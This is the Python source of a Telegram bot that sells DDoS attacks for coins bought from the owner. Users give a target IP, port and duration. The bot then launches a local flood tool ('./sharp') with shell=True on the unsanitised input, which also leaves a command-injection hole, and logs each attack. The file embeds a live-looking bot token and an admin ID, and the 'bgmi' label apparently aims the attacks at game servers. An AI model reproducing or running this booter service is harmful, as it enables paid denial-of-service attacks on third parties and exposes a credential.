import json
import subprocess
import requests
import datetime
import os
import threading
import time
import random
import string
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from flask import Flask
from threading import Thread
import telebot

# Telegram bot token
bot = telebot.TeleBot('7793043515:AAFdDKkJORGU8iHhvcZ1fI15XgLowWkOARc')

# Admin user IDs
admin_id = ["5163805719"]  # Only these users can access logs and add coins

# File path for coins and logs
COINS_FILE = "user_coins.json"
ATTACK_LOGS_FILE = "attack_logs.json"

# Data structure for coins and logs
user_coins = {}
attack_logs = {}
admin_state = {}  # Track admin input steps for addcoins command
user_state = {}  # Track user input steps for other commands

# Load coins and logs from file
def load_user_coins():
    global user_coins
    try:
        with open(COINS_FILE, 'r') as file:
            user_coins = json.load(file)
    except FileNotFoundError:
        user_coins = {}

def load_attack_logs():
    global attack_logs
    try:
        with open(ATTACK_LOGS_FILE, 'r') as file:
            attack_logs = json.load(file)
    except FileNotFoundError:
        attack_logs = {}

# Save coins and logs to file
def save_user_coins():
    with open(COINS_FILE, 'w') as file:
        json.dump(user_coins, file)

def save_attack_logs():
    with open(ATTACK_LOGS_FILE, 'w') as file:
        json.dump(attack_logs, file)

# Manage coins
def add_coins(user_id, amount):
    user_id = str(user_id)
    user_coins[user_id] = user_coins.get(user_id, 0) + amount
    save_user_coins()

def deduct_coins(user_id, amount):
    user_id = str(user_id)
    if user_coins.get(user_id, 0) >= amount:
        user_coins[user_id] -= amount
        save_user_coins()
        return True
    return False

def get_user_coins(user_id):
    return user_coins.get(str(user_id), 0)

# Add logs for attacks
def add_attack_log(user_id, target, port, duration):
    user_id = str(user_id)
    if user_id not in attack_logs:
        attack_logs[user_id] = []
    attack_logs[user_id].append({
        "target": target,
        "port": port,
        "duration": duration,
        "timestamp": str(datetime.datetime.now())
    })
    save_attack_logs()

# Load data on startup
load_user_coins()
load_attack_logs()

# Command handlers
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    user_id = str(message.chat.id)

    # Create ReplyKeyboardMarkup
    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
    markup.add(KeyboardButton('bgmi'), KeyboardButton('my balance💲'))
    markup.add(KeyboardButton('information⁉️'), KeyboardButton('🤑View Plans'))

    # Check if the user is an admin
    if user_id in admin_id:
        # Add admin-specific buttons
        markup.add(KeyboardButton('addcoins'), KeyboardButton('logs'), KeyboardButton('attacklogs'))

    bot.reply_to(message, f"🎊Welcome {user_name}! Please select an option below please contact owner or add coins your wallet before using ddos service ✅thank you❤   👤owner @kiing_op", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text.lower() == 'bgmi')
def handle_bgmi(message):
    user_id = str(message.chat.id)
    bot.reply_to(message, "Enter the target IP address📡")
    user_state[user_id] = {'step': 1}  # Initialize attack steps

@bot.message_handler(func=lambda message: str(message.chat.id) in user_state)
def handle_attack_steps(message):
    user_id = str(message.chat.id)
    state = user_state[user_id]

    if state['step'] == 1:
        state['target'] = message.text
        state['step'] = 2
        bot.reply_to(message, "Enter target port🔌")
    elif state['step'] == 2:
        try:
            state['port'] = int(message.text)
            state['step'] = 3
            bot.reply_to(message, "Enter attack duration (in seconds)⌚")
        except ValueError:
            bot.reply_to(message, "❗Invalid port. Please enter a numer only")
    elif state['step'] == 3:
        try:
            state['time'] = int(message.text)
            target = state['target']
            port = state['port']
            duration = state['time']

            # Simulating attack logic and deducting coins
            if get_user_coins(user_id) >= 10:  # Check if the user has enough coins
                deduct_coins(user_id, 10)  # Deduct coins only now
                bot.reply_to(
                    message,
                    f"Starting attack done🚀\n 📡{target} \n 🔌{port} \n⌚{duration} seconds...\n"
                    f"🪙10 coins dedicat your account ✅"
                )
                full_command = f"./sharp {target} {port} {duration} 1000"
                subprocess.run(full_command, shell=True)
                bot.reply_to(
                    message,
                    f"🚀Attack completed on {target}:{port} for {duration} seconds."
                )
                add_attack_log(user_id, target, port, duration)  # Log the attack
                del user_state[user_id]  # Clear user state
            else:
                bot.reply_to(
                    message,
                    "🪙coins Insufficient⁉️opps you have a not coin to process this recvest 🚀 to get add coin buy owner👤 @kiing_op  "
                )
                del user_state[user_id]  # Clear user state
        except ValueError:
            bot.reply_to(message, "Invalid duration. Please enter a numer only")

@bot.message_handler(func=lambda message: message.text.lower() == '🤑view plans')
def show_plans(message):
    plans = """
Here are our coin plans:
♌1. 100 coins for 50rs🤑
♌2. 500 coins for 200rs🤑
♌3. 1000 coins for 400rs🤑
♌ ♻️ Try one time 10 coins for 10rs👍♻️
👤Contact admin to buy coins 👉 @KIING_OP 
    """
    bot.reply_to(message, plans)

@bot.message_handler(func=lambda message: message.text.lower() == 'logs')
def view_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = "User Coins Logs:\n"
        for user, coins in user_coins.items():
            response += f"User ID: {user}, Coins: {coins}\n"
        bot.reply_to(message, response)
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

@bot.message_handler(func=lambda message: message.text.lower() == 'attacklogs')
def view_attack_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if not attack_logs:
            bot.reply_to(message, "No attack logs available.")
        else:
            response = "User Attack Logs:\n"
            for user, logs in attack_logs.items():
                response += f"\nUser ID: {user}\n"
                for log in logs:
                    response += f" - Target: {log['target']}, Port: {log['port']}, Duration: {log['duration']} seconds, Time: {log['timestamp']}\n"
            bot.reply_to(message, response)
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Flask app to keep alive
app = Flask(__name__)
@app.route('/')
def index():
    return "Bot is running!"

def log_running_status():
    while True:
        print("Bot is running...")
        time.sleep(60)  # Prints every 5 seconds

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t1 = Thread(target=run)
    t2 = Thread(target=log_running_status)  # Added continuous status logging
    t1.start()
    t2.start()

# Start bot
if __name__ == "__main__":
    keep_alive()
    bot.polling(none_stop=True)